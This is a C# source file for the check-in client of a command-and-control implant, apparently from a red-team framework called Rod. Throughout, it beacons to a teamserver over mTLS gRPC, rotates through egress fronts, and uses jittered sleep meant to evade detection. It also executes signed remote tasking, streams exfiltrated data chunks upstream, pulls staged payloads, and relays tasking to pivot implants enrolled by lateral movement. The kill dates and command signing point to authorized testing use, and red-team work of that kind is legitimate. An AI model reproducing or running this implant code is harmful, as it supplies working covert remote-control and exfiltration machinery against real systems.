using System.Collections.Concurrent;
using System.Net.Security;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using Google.Protobuf;
using Grpc.Core;
using Grpc.Net.Client;
using Rod.V1;
// The generated gRPC client lives in Rod.V1.Beacon (a static client factory
// class with the nested BeaconClient). This class is also named Beacon, so alias
// the generated one to avoid the name clash.
using WireBeacon = Rod.V1.Beacon;

namespace Rod.Implant.Internal;

// The reference implant's mTLS check-in client: it opens the long-lived reverse
// Beacon.CheckIn stream, completes the handshake, and then loops reading
// downstream tasking and writing upstream results (architecture.md Sec 5/8,
// Sec 10.3). The stream is bidirectional frames whose payloads are the rod.v1
// handshake/task/result messages.

/// <summary>
/// Runs the implant's check-in lifecycle against the teamserver: dial the mTLS
/// endpoint, complete the handshake, then loop dispatching downstream tasks and
/// reporting upstream results. Blocks until the cancellation token fires or the
/// baked-in kill date passes. The cadence follows the baked-in sleep + jitter
/// profile.
/// </summary>
internal sealed class Beacon : ICheckInClient
{
    // How one check-in cycle uses the stream. Stream holds the connection open
    // for the life of the session -- the interactive shape, server-push
    // tasking with no reconnect cost. Poll drains queued tasking, closes the
    // stream, and sleeps the beacon interval: the low-and-slow shape, where a
    // persistent connection would be the loudest signal an implant emits.
    // Both ride the same stream contract; only the client's use of it differs.
    private readonly string _mode;
    private readonly EgressEndpoints _egress;
    private readonly string _implantId;
    private readonly X509Certificate2 _leaf;
    private readonly ECDsa _privateKey;
    private readonly IReadOnlyList<X509Certificate2> _cas;
    private readonly TimeSpan _sleep;
    private readonly TimeSpan _jitter;
    private readonly DateTimeOffset? _killDate;
    private readonly HandlerRegistry _handlers;
    private readonly IReadOnlyList<string> _classVerbs;
    private readonly TextWriter _log;

    // The live cadence (runtime-retunable through beacon.sleep); null keeps
    // the baked sleep/jitter pair, the pre-cadence shape tests construct.
    private readonly Cadence? _cadence;

    // The fronted-pivot ledger (architecture.md Sec 5.2): the Pivot children
    // this implant enrolled, whose tasking this stream executes. Null when
    // derivation is disabled (no enroll bundle) -- nothing is fronted then.
    private readonly FrontedPivots? _fronted;

    // The replay-nonce state (architecture.md Sec 9 -- tasking replay nonces):
    // the accepted-nonce floor spans the implant's whole run, so a captured
    // frame replayed after a reconnect still falls at or below it. Shared
    // with the envelope client when both cover one run.
    private readonly TaskNonceTracker _nonces;

    /// <summary>
    /// Builds a Beacon whose handler registry carries no enroll bundle, so the
    /// lateral.move handler reports derivation as unavailable.
    /// </summary>
    public Beacon(EgressEndpoints egress, string implantId, X509Certificate2 leaf, ECDsa privateKey,
        IReadOnlyList<X509Certificate2> cas, TimeSpan sleep, TimeSpan jitter, DateTimeOffset? killDate,
        IReadOnlyList<string> classVerbs, TextWriter log)
        : this(egress, implantId, leaf, privateKey, cas, sleep, jitter, killDate, enroll: null, classVerbs, log)
    {
    }

    /// <summary>
    /// Builds a Beacon with an explicit check-in mode ("stream" or "poll"; the
    /// baked profile or the -mode flag decides). See the field comment for what
    /// each mode trades.
    /// </summary>
    public Beacon(string mode, EgressEndpoints egress, string implantId, X509Certificate2 leaf, ECDsa privateKey,
        IReadOnlyList<X509Certificate2> cas, TimeSpan sleep, TimeSpan jitter, DateTimeOffset? killDate,
        EnrollBundle? enroll, IReadOnlyList<string> classVerbs, TextWriter log,
        TaskNonceTracker? nonces = null, Cadence? cadence = null)
        : this(egress, implantId, leaf, privateKey, cas, sleep, jitter, killDate, enroll, classVerbs, log, nonces, cadence)
    {
        _mode = mode;
    }

    /// <summary>
    /// Builds a Beacon whose lateral.move handler can derive a child using
    /// <paramref name="enroll"/> (architecture.md Sec 10.1). A null bundle leaves
    /// derivation disabled. <paramref name="classVerbs"/> is the baked verb set;
    /// the advertised capability set derives from it (Sec 5.3).
    /// <paramref name="egress"/> is the baked endpoint walk (Sec 8): the cycle
    /// dials the current entry and a failed cycle advances to the next.
    /// <paramref name="nonces"/> shares the replay-nonce floor with another
    /// check-in client covering the same run (the envelope client); null keeps
    /// this beacon's own tracker. <paramref name="cadence"/> is the live
    /// check-in cadence beacon.sleep retunes; null keeps the baked pair.
    /// </summary>
    public Beacon(EgressEndpoints egress, string implantId, X509Certificate2 leaf, ECDsa privateKey,
        IReadOnlyList<X509Certificate2> cas, TimeSpan sleep, TimeSpan jitter, DateTimeOffset? killDate,
        EnrollBundle? enroll, IReadOnlyList<string> classVerbs, TextWriter log,
        TaskNonceTracker? nonces = null, Cadence? cadence = null)
    {
        _mode = BeaconModes.Stream;
        _egress = egress;
        _implantId = implantId;
        _leaf = leaf;
        _privateKey = privateKey;
        _cas = cas;
        _sleep = sleep;
        _jitter = jitter;
        _killDate = killDate;
        // The registry carries the reference set plus whatever out-of-tree
        // handlers the build unit baked through ExtensionRegistrations (the
        // extension kit's additional seam, extending/tradecraft.md): empty in
        // the dev stub, generated per build when an extension directory is
        // configured. The cadence rides in so beacon.sleep retunes this run.
        _handlers = HandlerRegistry.Default(enroll, cadence, ExtensionRegistrations.Handlers);
        _cadence = cadence;
        // The same bundle's fronted ledger (Sec 5.2): the lateral.move handler
        // records each Pivot child into it, and the tasking loop above gates
        // fronted tasking on it -- one instance, shared by derivation and
        // fronting.
        _fronted = enroll?.Fronted;
        _classVerbs = classVerbs;
        _log = log;
        _nonces = nonces ?? new TaskNonceTracker();
    }

    /// <summary>
    /// This client carries the bare host:port URL shape (architecture.md
    /// Sec 8): the mTLS socket the gRPC stream dials. A schemed http(s)
    /// beacon URL belongs to the envelope POST cycle client instead.
    /// </summary>
    public bool Serves(string beaconUrl) => !BeaconUrl.IsWeb(beaconUrl);

    /// <summary>
    /// Blocks until cancellation or the kill date passing. Reconnects after a
    /// jittered sleep when the stream drops (implants are connection initiators;
    /// flapping is expected and handled by reconnecting, architecture.md Sec 8),
    /// backing off exponentially over consecutive failures so a down teamserver
    /// is not hammered at beacon rate. The kill date is checked at the top of
    /// each cycle so a long-running implant self-terminates once it passes, not
    /// only on the next restart (architecture.md Sec 7). Returns
    /// <see cref="CheckInExit.SwitchTransport"/> when the walk's current entry
    /// is a web URL, so the coordinator hands the run to the envelope client.
    /// </summary>
    public async Task<CheckInExit> RunAsync(CancellationToken cancellationToken)
    {
        var consecutiveFailures = 0;
        while (!cancellationToken.IsCancellationRequested)
        {
            if (_killDate is { } killDate && DateTimeOffset.Now > killDate)
            {
                _log.WriteLine($"beacon kill date {killDate:O} reached; terminating");
                return CheckInExit.Terminate;
            }
            // The transport selection follows the egress walk's URL shape: a
            // web entry (http(s)://) is the envelope POST client's -- yield so
            // the coordinator hands the run over. Re-checked every cycle, so a
            // walk that crosses shapes re-routes at the next entry.
            if (BeaconUrl.IsWeb(_egress.CurrentBeaconUrl))
                return CheckInExit.SwitchTransport;
            var cycle = BeaconCycleResult.Dropped;
            try
            {
                cycle = await RunOnceAsync(cancellationToken);
            }
            catch (OperationCanceledException)
            {
                throw;
            }
            catch (RpcException ex)
            {
                _log.WriteLine($"beacon stream ended: {ex.Status.Detail}");
            }
            catch (Exception ex)
            {
                _log.WriteLine($"beacon stream ended: {ex.Message}");
            }

            // A handshake refusal is permanent for this artifact (retired, kill
            // date expired, unknown implant -- none of them change on a retry),
            // so the loop ends there instead of reconnecting forever.
            if (cycle == BeaconCycleResult.Terminal)
                return CheckInExit.Terminate;

            if (cycle == BeaconCycleResult.Handshaken)
            {
                consecutiveFailures = 0;
            }
            else
            {
                consecutiveFailures++;
                // The egress walk (architecture.md Sec 8): a cycle that never
                // reached a handshake means the current front is not answering,
                // so the next attempt dials the next entry. The walk wraps to the
                // primary, keeping the whole list in rotation; a cycle that
                // handshook keeps the entry that answered.
                var from = _egress.CurrentBeaconUrl;
                _egress.Advance();
                if (from != _egress.CurrentBeaconUrl)
                    _log.WriteLine($"beacon endpoint {from} failed; walking to {_egress.CurrentBeaconUrl}");
            }
            try
            {
                // The cadence is read fresh every cycle, so a beacon.sleep
                // change lands on the very next sleep.
                var (sleep, jitter) = _cadence?.Current ?? (_sleep, _jitter);
                await CheckInCadence.SleepWithJitterAsync(sleep, jitter, consecutiveFailures, cancellationToken);
            }
            catch (OperationCanceledException)
            {
                return CheckInExit.Terminate;
            }
        }
        return CheckInExit.Terminate;
    }

    // What one connect-handshake-task cycle produced, driving the reconnect
    // policy in RunAsync.
    private enum BeaconCycleResult
    {
        // The cycle never reached a handshake (a transport drop); retry.
        Dropped,

        // The handshake succeeded and the stream ran; reset the failure counter.
        Handshaken,

        // The server refused the handshake permanently; the caller terminates.
        Terminal,
    }

    // One connect-handshake-task cycle. Returns how the cycle ended so the
    // caller can distinguish a transport drop (retry) from a handshake refusal
    // (permanent). Throws on transport errors, which the caller logs and
    // retries.
    private async Task<BeaconCycleResult> RunOnceAsync(CancellationToken cancellationToken)
    {
        using var handler = new SocketsHttpHandler();
        var pinned = new X509Certificate2Collection();
        foreach (var ca in _cas)
            pinned.Add(ca);
        handler.SslOptions = new SslClientAuthenticationOptions
        {
            ClientCertificates = new X509Certificate2Collection(_leaf),
            RemoteCertificateValidationCallback = (_, cert, chain, errors) =>
                C2.PinServerChain(cert as X509Certificate2, chain, pinned),
        };

        // grpc-dotnet takes the channel address; HTTPS transport security comes
        // from the SocketsHttpHandler's SslOptions. The beacon URL may be passed
        // as "host:port" (no scheme); prepend https:// so the channel builder
        // accepts it.
        var address = GrpcAddress(_egress.CurrentBeaconUrl);
        using var channel = GrpcChannel.ForAddress(address, new GrpcChannelOptions
        {
            HttpHandler = handler,
        });

        var client = new WireBeacon.BeaconClient(channel);
        using var call = client.CheckIn(cancellationToken: cancellationToken);

        // The implant speaks first: handshake with its protocol version and identity.
        // The advertised capability set is the baked class verbs intersected with
        // the compiled handlers (architecture.md Sec 5.3), so the teamserver only
        // ever dispatches verbs this binary can run -- never an advertised verb
        // with no handler behind it.
        var handshake = new HandshakeRequest
        {
            Version = new ProtocolVersion { Major = 1, Minor = 0 },
            ImplantId = _implantId,
            // Advertise the replay-nonce arm (architecture.md Sec 9): when the
            // server echoes it, every dispatched task carries a per-implant
            // monotonic nonce covered by the signature, and tasking without
            // one is refused. A server that does not echo keeps the nonce-less
            // shape, and verification falls back to the original tuple.
            ReplayNonces = true,
        };
        handshake.Capabilities.Add(_handlers.AdvertisedVerbs(_classVerbs));
        await call.RequestStream.WriteAsync(new Frame { Payload = ByteString.CopyFrom(handshake.ToByteArray()) });

        if (!await call.ResponseStream.MoveNext(cancellationToken))
            throw new RpcException(new Status(StatusCode.Unavailable, "handshake: stream closed"));
        var hs = HandshakeResponse.Parser.ParseFrom(call.ResponseStream.Current.Payload);
        if (hs.Status != HandshakeStatus.Ok)
        {
            // Every non-OK handshake status (unknown implant, kill date expired,
            // retired, identity/version mismatch) is permanent for this artifact:
            // retrying would not change the answer, so terminate instead of
            // reconnecting forever.
            _log.WriteLine($"handshake refused: {hs.Status}; terminating");
            return BeaconCycleResult.Terminal;
        }
        _nonces.Negotiated = hs.ReplayNonces;
        _log.WriteLine($"handshake ok: engagement={hs.EngagementId}, replay-nonces={hs.ReplayNonces}");

        // Tasking loop: read TaskRequest downstream, dispatch, write TaskResult
        // up. Stream mode blocks until the server closes; poll mode drains the
        // queue and ends the cycle on a short idle window (below), so the
        // implant can sleep the beacon interval instead of holding a line open.
        // A staged task (the typed arm, architecture.md Sec 10) is demanded and
        // reassembled before its handler runs -- the bulk payload arrives as a
        // chunk run, never inside the arguments string.
        //
        // The streaming task shape (architecture.md Sec 10.3) runs alongside:
        // a write gate serializes this loop and every live channel's pumps --
        // the gRPC stream allows one outstanding write -- and the live
        // channels, keyed by task id, take the ChannelInput frames the loop
        // routes to them. Both die with the stream: the finally cancels every
        // channel and waits out its pumps.
        var writeGate = new SemaphoreSlim(1, 1);
        var liveChannels = new ConcurrentDictionary<string, BeaconLiveChannel>();
        using var channelsGone = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
        try
        {
            while (await MoveNextFrameAsync(call.ResponseStream, cancellationToken))
            {
                var frame = call.ResponseStream.Current;

                // ChannelInput is the only kind-bearing downstream frame:
                // operator input for a live channel, routed by task id. A
                // kindless frame is the positional grammar -- a TaskRequest,
                // or a staged chunk run this implant demanded.
                if (frame.Kind == FrameKind.ChannelInput)
                {
                    RouteChannelInput(frame, liveChannels);
                    continue;
                }

                var task = TaskRequest.Parser.ParseFrom(frame.Payload);

                // Fronted tasking (architecture.md Sec 5.2): a frame marked
                // with another implant's id is a Pivot child's tasking this
                // stream executes on the child's behalf -- the child has no
                // process to check in with. The gate is the fronted ledger:
                // only a child this implant enrolled is frontable, so tasking
                // for any other implant is refused on the task even when the
                // signature verifies (the signature binds the tuple to the
                // target id, Sec 9; it does not say this implant fronts the
                // target).
                var targetId = _implantId;
                var fronted = false;
                if (task.HasTargetImplantId && task.TargetImplantId.Length > 0 && task.TargetImplantId != _implantId)
                {
                    targetId = task.TargetImplantId;
                    fronted = true;
                    if (_fronted is null || !_fronted.Knows(targetId))
                    {
                        _log.WriteLine($"task {task.TaskId} refused: fronting for unknown implant {targetId}");
                        await WriteFrameAsync(
                            call, writeGate,
                            ResultFrame(task, TaskOutcome.Failed,
                                $"task refused: fronted tasking for implant {targetId}, which this implant did not enroll; not executed"),
                            cancellationToken);
                        continue;
                    }
                }

                // Command signing (architecture.md Sec 9): verify the teamserver's
                // signature before any handler runs, and -- once the replay-nonce
                // arm is live -- that the task's nonce advances the accepted
                // floor. A task that fails either is reported Failed with the
                // cause -- the operator sees the rejection on the task itself,
                // so a replayed frame surfaces as a refused task -- and nothing
                // executes. The signed tuple's implant id is the target's own:
                // this implant's for own tasking, the fronted child's for
                // fronted tasking. The nonce arm follows the target too -- a
                // pivot child never handshakes, so its tasking keeps the
                // nonce-less shape and a fresh tracker keeps this implant's
                // negotiated floor from refusing it.
                TaskOutcome outcome;
                string output;
                IReadOnlyList<ExfilChunk> chunks;
                var verdict = TaskingVerifier.Verify(
                    targetId, task, _cas, fronted ? new TaskNonceTracker() : _nonces);
                if (verdict != TaskingVerdict.Accepted)
                {
                    var cause = verdict switch
                    {
                        TaskingVerdict.RejectedReplay =>
                            $"task rejected: replayed tasking (nonce {task.TaskNonce} at or below the accepted floor); not executed",
                        TaskingVerdict.RejectedNoNonce =>
                            "task rejected: no task nonce after the replay-nonce handshake; not executed",
                        _ => "task rejected: signature verification failed; not executed",
                    };
                    _log.WriteLine($"task {task.TaskId} rejected: {verdict}");
                    outcome = TaskOutcome.Failed;
                    output = cause;
                    chunks = Array.Empty<ExfilChunk>();
                }
                else if (_handlers.ChannelFor(task.Verb) is { } channelHandler)
                {
                    // The streaming shape: the task opens a channel instead of
                    // completing inline. A poll cycle cannot host one -- its
                    // read loop ends on the idle window, and there is no
                    // downstream half to carry input -- so the refusal is
                    // reported on the task itself. On a live stream the handler
                    // runs in the background and reports its own final
                    // TaskResult; the loop keeps reading while it runs.
                    if (IsPoll)
                    {
                        _log.WriteLine($"task {task.TaskId} refused: no channel on a poll cycle");
                        await WriteFrameAsync(
                            call, writeGate,
                            ResultFrame(task, TaskOutcome.Failed,
                                $"{task.Verb} requires a stream-mode check-in; a poll cycle carries no channel"),
                            cancellationToken);
                    }
                    else
                    {
                        StartChannel(call, writeGate, liveChannels, task, channelHandler, channelsGone.Token);
                    }
                    continue;
                }
                else if (task.HasStagedBytes)
                {
                    (outcome, output) = await RunStagedTaskAsync(call, writeGate, task, cancellationToken);
                    chunks = Array.Empty<ExfilChunk>();
                }
                else
                {
                    (outcome, output, chunks) = _handlers.Dispatch(task.Verb, task.Arguments);
                }

                await WriteFrameAsync(call, writeGate, ResultFrame(task, outcome, output), cancellationToken);

                // Out-of-band exfil chunks follow the TaskResult on the same stream.
                // Each carries the task id so the server reassembles and routes them
                // to the artifact store (architecture.md Sec 10.1 exfil, Sec 11).
                foreach (var chunk in chunks)
                {
                    chunk.TaskId = task.TaskId;
                    await WriteFrameAsync(call, writeGate, new Frame
                    {
                        Payload = ByteString.CopyFrom(chunk.ToByteArray()),
                        Kind = FrameKind.ExfilChunk,
                    }, cancellationToken);
                }
            }

            // Poll mode: the queue is drained and the idle window closed the read
            // loop -- half-close the send side and wait for the server to end the
            // stream, so every result written above is fully delivered before the
            // cycle ends and the beacon sleeps.
            if (IsPoll)
            {
                try
                {
                    await call.RequestStream.CompleteAsync();
                    while (await call.ResponseStream.MoveNext(cancellationToken))
                    {
                        // Nothing further is expected; drain until the server ends.
                    }
                }
                catch (RpcException)
                {
                    // The server tore the stream down as it processed the
                    // half-close; the results are already upstream.
                }
            }
        }
        finally
        {
            // The stream is ending: the channels are session-scoped, so they
            // end with it. The token releases the handlers (their processes
            // are killed and their pumps unwind), and the delivery waits keep
            // the call alive until every pump's last write has left the gate.
            channelsGone.Cancel();
            foreach (var live in liveChannels.Values)
                live.CompleteInput();
            await Task.WhenAll(liveChannels.Values.Select(c => c.Delivery));
        }

        return BeaconCycleResult.Handshaken;
    }

    // gRPC streams allow one outstanding write at a time; the dispatch loop
    // and every live channel's output pumps share this stream, so all of them
    // write through this gate. The token bounds the wait, not the write -- an
    // in-flight write cancels with the call itself.
    private static async ValueTask WriteFrameAsync(
        AsyncDuplexStreamingCall<Frame, Frame> call,
        SemaphoreSlim writeGate,
        Frame frame,
        CancellationToken cancellationToken)
    {
        await writeGate.WaitAsync(cancellationToken);
        try
        {
            await call.RequestStream.WriteAsync(frame);
        }
        finally
        {
            writeGate.Release();
        }
    }

    private static Frame ResultFrame(TaskRequest task, TaskOutcome outcome, string output)
        => new()
        {
            Payload = ByteString.CopyFrom(new TaskResult
            {
                TaskId = task.TaskId,
                Outcome = outcome,
                Output = output,
            }.ToByteArray()),
            Kind = FrameKind.TaskResult,
        };

    // Opens a channel for a dispatched streaming task and starts its handler
    // in the background: the loop returns to reading immediately, the channel
    // takes its input frames as they arrive, and the delivery task reports
    // the handler's outcome as the task's final TaskResult.
    private void StartChannel(
        AsyncDuplexStreamingCall<Frame, Frame> call,
        SemaphoreSlim writeGate,
        ConcurrentDictionary<string, BeaconLiveChannel> liveChannels,
        TaskRequest task,
        CapabilityChannelHandler handler,
        CancellationToken lifetime)
    {
        var channel = new BeaconLiveChannel(
            task.TaskId,
            (frame, ct) => WriteFrameAsync(call, writeGate, frame, ct));
        liveChannels[task.TaskId] = channel;
        _log.WriteLine($"channel opened: task {task.TaskId} verb {task.Verb}");
        channel.Delivery = DeliverChannelAsync(call, writeGate, liveChannels, channel, task, handler, lifetime);
    }

    // The channel's delivery: run the handler to its end, then write its
    // outcome. A channel whose stream dies under it ends silently -- there is
    // no operator left to tell, and the server-side task stays dispatched,
    // the documented session-scoped lifetime.
    private async Task DeliverChannelAsync(
        AsyncDuplexStreamingCall<Frame, Frame> call,
        SemaphoreSlim writeGate,
        ConcurrentDictionary<string, BeaconLiveChannel> liveChannels,
        BeaconLiveChannel channel,
        TaskRequest task,
        CapabilityChannelHandler handler,
        CancellationToken lifetime)
    {
        try
        {
            var (outcome, output) = await handler.Handle(task.Arguments, channel, lifetime);
            await WriteFrameAsync(call, writeGate, ResultFrame(task, outcome, output), CancellationToken.None);
            _log.WriteLine($"channel closed: task {task.TaskId} outcome {outcome}");
        }
        catch (Exception ex)
        {
            _log.WriteLine($"channel ended without delivery: task {task.TaskId}: {ex.Message}");
        }
        finally
        {
            liveChannels.TryRemove(task.TaskId, out _);
            channel.CompleteInput();
        }
    }

    // One ChannelInput frame: operator input for a live channel, routed by
    // task id. Input for a task with no live channel is dropped and logged --
    // a channel that already ended, or input that raced the stream.
    private void RouteChannelInput(
        Frame frame,
        ConcurrentDictionary<string, BeaconLiveChannel> liveChannels)
    {
        ChannelInput input;
        try
        {
            input = ChannelInput.Parser.ParseFrom(frame.Payload);
        }
        catch (Google.Protobuf.InvalidProtocolBufferException)
        {
            return;
        }

        if (liveChannels.TryGetValue(input.TaskId, out var channel))
        {
            if (!channel.Receive(input.Data.ToArray(), input.Eof))
                _log.WriteLine($"channel input for task {input.TaskId} dropped: input queue full");
        }
        else
        {
            _log.WriteLine($"channel input for unknown task {input.TaskId} dropped");
        }
    }

    // One live task channel on this stream: the input queue the loop routes
    // ChannelInput frames into, the write binding that streams output chunks
    // upstream through the stream's write gate, and the delivery task that
    // reports the handler's final TaskResult. Implements IChannelStream, so
    // the handler never touches the transport (architecture.md Sec 10.3) --
    // the shared BeaconLiveChannel, extracted so the WebSocket stream client
    // binds the same shape to its own writer.

    // How long a poll-mode read waits for the next downstream frame before
    // deciding the queue is drained. The server pushes tasking the moment it
    // is queued, so the window only needs to outlast that push; a close that
    // races a dispatch is still safe -- an unclaimed task stays queued, and a
    // task whose frame write failed is requeued server-side. Staged transfers
    // never see this window: they read on the longer deadline below.
    private static readonly TimeSpan PollIdleWindow = TimeSpan.FromMilliseconds(250);

    // How long a staged read waits for the next chunk before giving up on the
    // transfer. An active transfer is the implant's own request in flight --
    // unlike the idle window this must not cut a run in half, so it is a
    // timeout, not a cadence: a server that cannot produce the next chunk
    // within it has failed the transfer.
    private static readonly TimeSpan StagedChunkTimeout = TimeSpan.FromSeconds(30);

    // Runs one staged task (architecture.md Sec 10, the typed arm): demand the
    // payload, reassemble the chunk run the server answers with, then dispatch
    // the verb's staged handler. A transfer that ends early (stream dropped,
    // timeout, terminal chunk never arrived) is reported Failed on the task
    // itself -- the operator sees the cause where they look for the outcome.
    private async Task<(TaskOutcome Outcome, string Output)> RunStagedTaskAsync(
        AsyncDuplexStreamingCall<Frame, Frame> call,
        SemaphoreSlim writeGate,
        TaskRequest task,
        CancellationToken cancellationToken)
    {
        await WriteFrameAsync(call, writeGate, new Frame
        {
            Payload = ByteString.CopyFrom(new StagedPull { TaskId = task.TaskId }.ToByteArray()),
            Kind = FrameKind.StagedPull,
        }, cancellationToken);

        var parts = new List<byte[]>();
        var total = 0;
        while (true)
        {
            if (!await MoveNextStagedAsync(call.ResponseStream, cancellationToken))
            {
                _log.WriteLine($"task {task.TaskId}: staged stream ended before the terminal chunk");
                return (TaskOutcome.Failed, "staged payload stream ended before the terminal chunk");
            }

            StagedChunk chunk;
            try
            {
                chunk = StagedChunk.Parser.ParseFrom(call.ResponseStream.Current.Payload);
            }
            catch (Google.Protobuf.InvalidProtocolBufferException)
            {
                return (TaskOutcome.Failed, "staged payload contained a malformed chunk");
            }
            if (chunk.TaskId != task.TaskId)
                return (TaskOutcome.Failed, "staged payload chunk carried a foreign task id");

            var data = chunk.Data.ToArray();
            parts.Add(data);
            total += data.Length;
            if (chunk.Terminal)
                break;
        }

        var payload = new byte[total];
        var offset = 0;
        foreach (var part in parts)
        {
            part.CopyTo(payload, offset);
            offset += part.Length;
        }
        return _handlers.DispatchStaged(task.Verb, task.Arguments, payload);
    }

    // One read of a staged chunk run: stream mode blocks on the token, poll
    // mode reads on the transfer timeout instead of the idle window so an
    // in-flight run is not mistaken for a drained queue.
    private async Task<bool> MoveNextStagedAsync(Grpc.Core.IAsyncStreamReader<Frame> stream, CancellationToken cancellationToken)
    {
        if (!IsPoll)
            return await stream.MoveNext(cancellationToken);

        using var deadline = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
        deadline.CancelAfter(StagedChunkTimeout);
        try
        {
            return await stream.MoveNext(deadline.Token);
        }
        catch (OperationCanceledException) when (!cancellationToken.IsCancellationRequested)
        {
            return false;
        }
        catch (RpcException) when (deadline.IsCancellationRequested && !cancellationToken.IsCancellationRequested)
        {
            return false;
        }
    }

    private bool IsPoll => _mode == BeaconModes.Poll;

    // One read of the downstream stream: stream mode blocks on the token, poll
    // mode adds the idle window whose expiry ends the cycle.
    private async Task<bool> MoveNextFrameAsync(Grpc.Core.IAsyncStreamReader<Frame> stream, CancellationToken cancellationToken)
    {
        if (!IsPoll)
            return await stream.MoveNext(cancellationToken);

        using var idle = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
        idle.CancelAfter(PollIdleWindow);
        try
        {
            return await stream.MoveNext(idle.Token);
        }
        catch (OperationCanceledException) when (!cancellationToken.IsCancellationRequested)
        {
            return false;
        }
        catch (RpcException) when (idle.IsCancellationRequested && !cancellationToken.IsCancellationRequested)
        {
            return false;
        }
    }

    // Normalizes the beacon URL into the form GrpcChannel.ForAddress expects: a
    // scheme is required, so "host:port" becomes "https://host:port" -- the mTLS
    // beacon a schemeless name means. An explicit http:// is honored as the
    // plaintext h2c beacon the teamserver's loopback dev listener serves (no
    // TLS, identity by handshake id alone; TransportHost's plain-HTTP bind).
    // Any trailing path is dropped -- gRPC uses the :authority, not a path.
    private static string GrpcAddress(string beaconUrl)
    {
        var u = beaconUrl.Trim();
        if (u.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
        {
            u = u["https://".Length..];
            var slash = u.IndexOf('/');
            if (slash >= 0)
                u = u[..slash];
            return $"https://{u}";
        }
        if (u.StartsWith("http://", StringComparison.OrdinalIgnoreCase))
        {
            u = u["http://".Length..];
            var slash = u.IndexOf('/');
            if (slash >= 0)
                u = u[..slash];
            return $"http://{u}";
        }
        var bare = u.IndexOf('/');
        if (bare >= 0)
            u = u[..bare];
        return $"https://{u}";
    }
}
